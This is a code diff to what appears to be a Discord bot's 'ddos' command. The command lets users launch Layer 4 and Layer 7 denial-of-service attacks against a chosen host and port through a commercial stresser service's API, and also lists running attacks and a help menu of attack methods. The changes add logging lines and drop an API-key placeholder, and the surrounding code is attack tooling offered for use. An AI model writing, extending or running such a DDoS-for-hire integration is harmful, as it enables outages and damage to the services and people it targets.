@@ -226,6 +226,7 @@ async def ddos(ctx, action, *args):
     api_key = "YOUR_API_KEY"  # Replace with your API key
 
     if action == "help":
+        print(f'[LOGS] Running ddos help command.')
         await ctx.send(f'''
 Layer 4 Methods
 
@@ -280,6 +281,7 @@ SPAMMER     HTTP     Spammer method for mass requests
 ELITE       HTTP
 ''')
     elif action == "get_running_attacks":
+        print(f'[LOGS] Running Get Running Attacks command for ddos module.')
         action = "running"
         params = {"key": api_key, "action": action}
         try:
@@ -297,6 +299,7 @@ ELITE       HTTP
             await ctx.send(f"An error occurred: {str(e)}")
     elif action == "launch_layer4_attack":
         if len(args) == 4:
+            print(f'[LOGS] Running Layer 4 Attack.')
             api_key, host, port, time, method = args
             base_url = "https://stresse.ru/api/api.php"
             action = "layer4"
@@ -337,7 +340,6 @@ ELITE       HTTP
                 con = extra_args[6]
 
             print(f'[LOGS] Running Layer 7 attack on {host} {port} | Method: {method} | Time: {time}')
-            api_key = ''  # Replace with your actual API key
 
             api_url = "https://stresse.ru/api/api.php"
             params = {
